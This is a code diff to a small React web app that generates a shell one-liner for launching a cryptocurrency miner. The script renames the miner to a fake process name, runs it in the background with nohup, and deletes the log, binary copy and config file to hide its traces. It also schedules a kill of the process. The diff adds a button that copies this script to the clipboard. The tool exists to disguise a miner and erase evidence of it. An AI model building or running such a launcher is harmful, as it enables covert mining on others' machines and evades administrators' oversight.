@@ -2,23 +2,28 @@ import React, {useState} from 'react';
 import './App.css';
 import '98.css';
 
-function App() {
+const App = () => {
     const [minerFilepath, setMinerFilepath] = useState('')
     const [fakeProcessName, setFakeProcessName] = useState('')
     const [config, setConfig] = useState('')
     const [configFilename, setConfigFilename] = useState('')
     const [killAt, setKillAt] = useState('')
+    const [message, setMessage] = useState('')
+
+    const clipboard = navigator.clipboard
 
     const script = ` echo ${new Buffer(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 5 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
 
     const handleCopyScriptBtnClick = () => {
-        console.log('Copy script btn click, state:', {
-            minerFilepath,
-            fakeProcessName,
-            config,
-            configFilename,
-            killAt,
-            script,
+        clipboard.writeText(script).then(() => {
+            setMessage('Copy script successful')
+        }).catch((e) => {
+            console.error(e)
+            setMessage('Failed to copy script')
+        }).finally(() => {
+            setTimeout(() => {
+                setMessage('')
+            }, 3000)
         })
     }
 
@@ -77,6 +82,9 @@ function App() {
                 </div>
                 <div className="field-row">
                     <button onClick={handleCopyScriptBtnClick}>Copy script</button>
+                </div>
+                <div>
+                    <p>{message}</p>
                 </div>
             </div>
         </div>
